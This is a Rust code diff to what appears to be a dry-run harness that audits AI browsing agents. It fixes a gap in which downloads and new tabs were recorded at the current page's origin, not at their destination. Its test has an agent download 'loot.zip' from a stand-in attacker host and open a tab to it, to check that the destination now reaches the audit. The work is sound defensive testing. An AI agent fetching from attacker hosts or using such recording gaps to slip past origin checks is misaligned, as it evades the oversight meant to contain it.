@@ -268,6 +268,20 @@ impl DryRunEngine {
         self.record.record_tool(primitive, origin);
     }
 
+    /// Records a call whose effect lands at `url`, not at the page the agent is
+    /// on: a download fetches from `url`, a new tab opens at `url`. The event
+    /// carries the origin of `url`, and the fetch is a network attempt.
+    ///
+    /// Before this, both were recorded at the *current page's* origin, so an
+    /// agent on an allowed site that downloaded from, or opened a tab to, an
+    /// attacker's URL produced an event at the allowed origin, which the
+    /// comparator admitted: the destination never reached the diff.
+    fn record_call_at(&mut self, primitive: Primitive, url: &str) {
+        self.record.record_network_attempt(url.to_string());
+        self.record
+            .record_tool(primitive, Some(super::record::extract_origin(url)));
+    }
+
     /// Runs the generic (non-page) detect/strip gate: `detect_injection_in_value`
     /// only, no HTML-channel-specific scan — the same treatment every
     /// non-`ReadPage` tool got pre-B1. See [`Self::gate_page`] for the page
@@ -568,12 +582,17 @@ impl BrowserEngine for DryRunEngine {
         });
         let served = self.gate_generic(Primitive::Download, reply);
         let path = Self::reply_to_string(served)?;
-        self.record_call(Primitive::Download, false);
+        // Recorded at the origin the file comes from, not the page it was asked on.
+        self.record_call_at(Primitive::Download, url);
         Ok((path, self.current_origin()?))
     }
 
     fn open_tab(&mut self, url: Option<&str>) -> Result<(TabId, Origin), EngineError> {
-        self.record_call(Primitive::TabOpen, false);
+        match url {
+            // A tab opened at a URL acts at that URL's origin.
+            Some(target) => self.record_call_at(Primitive::TabOpen, target),
+            None => self.record_call(Primitive::TabOpen, false),
+        }
         let id = TabId(self.next_tab);
         self.next_tab += 1;
         let initial = url
@@ -741,6 +760,53 @@ mod observation_tests {
             true,
             true,
         )
+    }
+
+    /// A download or a new tab acts at the URL it names, not at the page the
+    /// agent happens to be on. Recorded at the page's origin, an agent on an
+    /// allowed site could fetch from (or open a tab to) an attacker's URL and
+    /// produce an event the comparator admitted.
+    #[test]
+    fn a_download_and_a_new_tab_are_recorded_at_the_origin_they_reach() {
+        let mut engine = engine_with(DryRunContent::default(), Some("https://allowed.example/"));
+
+        engine
+            .download("https://attacker.example/loot.zip")
+            .expect("download");
+        engine
+            .open_tab(Some("https://attacker.example:8443/x"))
+            .expect("open_tab");
+        // A tab opened with no URL stays at the page it was opened from.
+        engine.current_url = "https://allowed.example/".to_string();
+        // (An about:blank tab has an opaque origin, so the call itself errors
+        // after recording; only the record matters here.)
+        let _ = engine.open_tab(None);
+
+        let events: Vec<(Primitive, &str)> = engine
+            .record
+            .tool_events
+            .iter()
+            .map(|e| (e.primitive, e.origin.as_deref().unwrap_or("")))
+            .collect();
+        assert_eq!(
+            events,
+            vec![
+                (Primitive::Download, "https://attacker.example"),
+                (Primitive::TabOpen, "https://attacker.example:8443"),
+                (Primitive::TabOpen, "https://allowed.example"),
+            ]
+        );
+        // Both fetches are network attempts, so the audit sees where they went.
+        assert!(engine
+            .record
+            .network_attempts
+            .iter()
+            .any(|u| u.contains("attacker.example/loot.zip")));
+        assert!(engine
+            .record
+            .network_attempts
+            .iter()
+            .any(|u| u.contains("attacker.example:8443")));
     }
 
     /// The critical constraint on the harness's per-step observation: it is
